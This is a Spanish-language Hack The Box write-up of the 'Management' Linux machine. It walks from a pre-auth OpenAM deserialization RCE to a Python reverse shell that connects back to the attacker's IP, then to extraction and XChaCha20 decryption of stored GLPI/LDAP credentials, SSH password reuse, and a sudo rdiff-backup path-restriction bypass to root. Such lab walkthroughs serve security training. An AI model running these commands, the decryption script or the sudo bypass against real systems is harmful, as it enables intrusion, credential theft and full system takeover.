# HTB — Management Writeup

Oct 5, 2026 · @Nacho

## Introducción

Management es una máquina Linux de dificultad fácil en Hack The Box centrada en la explotación de una aplicación web de SSO, la extracción y descifrado de credenciales almacenadas en base de datos, y la escalada de privilegios mediante una restricción de sudo mal configurada.

| Concepto | Valor |
| --- | --- |
| Plataforma | Hack The Box |
| Dificultad | Easy |
| SO | Ubuntu Linux |
| IP víctima | 10.129.117.145 |
| Técnicas | Pre-auth RCE · credential discovery · password reuse · sudo misconfiguration |

**Ruta general:** RCE pre-auth en OpenAM → credenciales de GLPI → descifrado XChaCha20 → SSH como owen → bypass de rdiff-backup con sudo → root.

## Fase 1 — Reconocimiento

Escaneo inicial de puertos para descubrir los servicios expuestos.

```bash
nmap -sVC -p 22,80,443,1689,4444,37277,50389 --min-rate 5000 -T4 -vvv -oG deep_scan.txt 10.129.117.145
```

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80 | HTTP | nginx 1.24.0 — redirige a HTTPS |
| 443 | HTTPS | nginx 1.24.0 — certificado para `management.htb` y `*.management.htb` |
| 1689 | Java RMI | — |
| 4444 | SSL/LDAP | Certificado para `sso.management.htb` (Admin Connector de OpenDJ) |
| 37277 | Java RMI | Puerto dinámico vinculado al 1689 |
| 50389 | LDAP | **Anonymous bind OK** — OpenDJ 5.0.3 |

Se añaden los dominios al `/etc/hosts`:

```bash
echo "10.129.117.145 management.htb sso.management.htb" | sudo tee -a /etc/hosts
```

El **naming context** del LDAP es `dc=management,dc=htb`, pero el bind anónimo no tiene permisos de lectura sobre el árbol de datos, por lo que la enumeración LDAP queda bloqueada.

## Fase 2 — Enumeración web

Se identifican dos aplicaciones distintas en función del subdominio:

- **`management.htb`** → GLPI (portal de gestión de TI)
- **`sso.management.htb`** → Portal de login **OpenAM Community Edition** versión **16.0.5**

La versión de OpenAM se extrae del campo `urlArgs` del HTML (`v=16.0.5`) y se confirma con el endpoint sin autenticación:

```bash
curl -sk "https://sso.management.htb/openam/json/serverinfo/*" | python3 -m json.tool
```

Este endpoint devuelve el `cookieName: iPlanetDirectoryPro`, firma inequívoca de OpenAM/ForgeRock AM. El certificado TLS del puerto 4444 confirma `sso.management.htb` como hostname del conector de administración de **OpenDJ 5.0.3**, el directorio LDAP que usa OpenAM como backend.

El endpoint de restablecimiento de contraseña está accesible sin autenticación:

```
https://sso.management.htb/openam/ui/PWResetUserValidation
```

## Fase 3 — Acceso inicial (RCE pre-auth en OpenAM)

OpenAM 16.0.5 es vulnerable a una **deserialización Java insegura** en el parámetro `jato.clientSession`. Las páginas que contienen un formulario JATO (como la de restablecimiento de contraseña) deserializan este parámetro sin validar la clase, lo que permite RCE sin autenticación.

Se usa el PoC público `infernosalex/CVE-2026-33439-Python-PoC`, que automatiza la construcción del payload serializado y su envío al endpoint vulnerable:

```bash
# Verificar que el RCE funciona
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation "id"
# → uid=996(openam) gid=987(openam) groups=987(openam)
```

Se lanza la reverse shell:

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — payload
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.15.233\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

Resultado: shell como `openam` (uid=996).

> **Nota técnica:** la versión CVE-2021-35464 original atacaba `jato.pageSession` en `/ccversion/Version`. Esta variante (OpenAM 16.x parcheada) usa `jato.clientSession` en endpoints con `<jato:form>`. El PoC selecciona automáticamente la gadget chain adecuada.

## Fase 4 — Enumeración interna

### Keystore JCEKS de OpenAM

El directorio `~/config/openam/` contiene un keystore JCEKS con las contraseñas de los servicios internos de OpenAM:

```bash
cat ~/config/openam/.storepass   # → <REDACTED>
cat ~/config/openam/.keypass     # → <REDACTED>

keytool -list -keystore ~/config/openam/keystore.jceks \
  -storetype JCEKS \
  -storepass '<REDACTED>'
```

Aliases extraídos (`configstorepwd` y `dsameuserpwd`) con `pyjks`:

| Alias | Tipo | Valor en texto |
| --- | --- | --- |
| configstorepwd | SecretKeyEntry | `<REDACTED>` |
| dsameuserpwd | SecretKeyEntry | `<REDACTED>` |

Estas claves **no son contraseñas de bind LDAP**, sino claves de cifrado internas de OpenAM. Probadas contra LDAP y SSH → fallan.

### Configuración de GLPI

GLPI está instalado en `/opt/glpi`. Su fichero de conexión a la base de datos expone las credenciales de MySQL:

```bash
cat /opt/glpi/config/config_db.php
# host: 127.0.0.1 | user: glpi | pass: <REDACTED> | db: glpidb
```

### Contraseña cifrada de LDAP en MySQL

```bash
mysql -h 127.0.0.1 -u glpi -p'<REDACTED>' glpidb \
  -e "SELECT rootdn, rootdn_passwd FROM glpi_authldaps\G"
```

Resultado:

| Campo | Valor |
| --- | --- |
| rootdn | `cn=svc-glpi,ou=services,dc=management,dc=htb` |
| rootdn\_passwd | `<REDACTED>` |

La clave de cifrado de GLPI está en `/opt/glpi/config/glpicrypt.key` (32 bytes binarios, sin codificar).

## Fase 5 — Descifrado de la contraseña LDAP

GLPI utiliza **XChaCha20-Poly1305 IETF** (librería `sodium` de PHP) para cifrar campos sensibles. El formato del blob almacenado en base de datos es:

```
nonce (24 bytes) || ciphertext || tag Poly1305 (16 bytes)
```

La firma real de la función en la versión de PHP del servidor es de **4 argumentos**, y el `tag` va concatenado al `ciphertext`, no como parámetro separado. Además, el `nonce` actúa también como **Additional Authenticated Data (AAD)**, dato clave que se obtiene leyendo el código fuente de `GLPIKey.php`:

```bash
grep -n -A 20 "public function decrypt" /opt/glpi/src/GLPIKey.php
# línea 500: sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(
#   $ciphertext, $nonce, $nonce, $key
# )
```

Script PHP de descifrado directo (sin cargar el framework de GLPI):

```php
<?php
$key        = file_get_contents('/opt/glpi/config/glpicrypt.key');
$encrypted  = base64_decode('<rootdn_passwd extraído de la DB>');

$nonce      = mb_substr($encrypted, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, '8bit');
$ciphertext = mb_substr($encrypted, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, null, '8bit');

// AAD = nonce (igual que hace GLPIKey::decrypt internamente)
$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ciphertext, $nonce, $nonce, $key);

if ($plaintext === false) {
    echo "ERROR: descifrado fallido\n";
} else {
    echo "Contraseña: " . $plaintext . "\n";
}
```

```bash
php /tmp/decrypt.php
# Contraseña: <REDACTED>
```

> **Punto clave:** los intentos con AES (CBC/ECB/GCM) y Python fallan porque el algoritmo es XChaCha20, no AES. La pista definitiva la da el código fuente de `GLPIKey.php`, que debe leerse directamente en la víctima.

## Fase 6 — Movimiento lateral (owen)

La contraseña descifrada de `cn=svc-glpi` se **reutiliza** como contraseña del usuario local `owen`. Este tipo de reutilización de credenciales entre un service account de LDAP y un usuario del sistema es un patrón frecuente en entornos mal administrados.

```bash
ssh owen@10.129.117.145
# Password: <contraseña descifrada en el paso anterior>
```

Flag de usuario:

```bash
cat ~/user.txt
```

## Fase 7 — Escalada de privilegios (root)

### Enumeración sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/rdiff-backup --server
#   --restrict-path /opt/backup --restrict-mode read-only *
```

El wildcard `*` al final permite pasar argumentos adicionales. La restricción de ruta a `/opt/backup` puede anularse porque `--restrict-path` se puede especificar **varias veces** y `rdiff-backup` acepta cualquiera de ellas.

### Bypass de la restricción de ruta

Se crea un wrapper script que ignora el argumento que `rdiff-backup` le pasa como cliente (`localhost`) y lanza el servidor con una segunda ruta que incluye todo el sistema de ficheros:

```bash
cat > /tmp/rdiff_server.sh << 'EOF'
#!/bin/bash
sudo /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup \
  --restrict-mode read-only \
  --restrict-path /
EOF
chmod +x /tmp/rdiff_server.sh
```

Se usa el wrapper como `--remote-schema` del cliente:

```bash
mkdir -p /tmp/rootback

rdiff-backup --remote-schema '/tmp/rdiff_server.sh %s' \
  backup localhost::/root /tmp/rootback
```

El wrapper recibe `localhost` como argumento (`%s`) pero lo ignora. El servidor se lanza con `--restrict-path /`, que cubre todo el árbol, y el cliente puede leer `/root` sin restricción.

### Flag de root

```bash
cat /tmp/rootback/root.txt
```

> **Por qué funciona:** `rdiff-backup` 2.x en modo `--server` no valida que los `--restrict-path` no se solapen. Añadir uno más amplio (`/`) cancela en la práctica la restricción original (`/opt/backup`). La clave está en que el sudo permite el wildcard `*` al final del comando, lo que da control total sobre los argumentos adicionales.
